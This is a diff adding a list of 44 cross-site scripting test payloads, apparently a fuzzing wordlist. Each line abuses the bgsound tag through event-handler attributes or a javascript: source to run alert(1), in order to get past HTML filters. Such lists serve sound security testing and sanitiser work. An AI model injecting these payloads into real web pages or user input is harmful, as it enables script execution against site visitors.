@@ -1,0 +1,45 @@
+<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragend="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
+<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
+<bgsound onafterscriptexecute=alert(1)><script>1</script>
+<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforescriptexecute=alert(1)><script>1</script>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onclick="alert(1)">test</bgsound>
+<bgsound oncontextmenu="alert(1)">test</bgsound>
+<bgsound oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<bgsound oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<bgsound ondblclick="alert(1)" autofocus tabindex=1>test</bgsound>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
+<bgsound onmousedown="alert(1)">test</bgsound>
+<bgsound onmouseenter="alert(1)">test</bgsound>
+<bgsound onmouseleave="alert(1)">test</bgsound>
+<bgsound onmousemove="alert(1)">test</bgsound>
+<bgsound onmouseout="alert(1)">test</bgsound>
+<bgsound onmouseover="alert(1)">test</bgsound>
+<bgsound onmouseup="alert(1)">test</bgsound>
+<bgsound onmousewheel=alert(1)>requires scrolling
+<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onpointerdown=alert(1)>XSS</bgsound>
+<bgsound onpointerenter=alert(1)>XSS</bgsound>
+<bgsound onpointerleave=alert(1)>XSS</bgsound>
+<bgsound onpointermove=alert(1)>XSS</bgsound>
+<bgsound onpointerout=alert(1)>XSS</bgsound>
+<bgsound onpointerover=alert(1)>XSS</bgsound>
+<bgsound onpointerrawupdate=alert(1)>XSS</bgsound>
+<bgsound onpointerup=alert(1)>XSS</bgsound>
+<BGSOUND SRC="javascript:javascript:alert(1);">
+
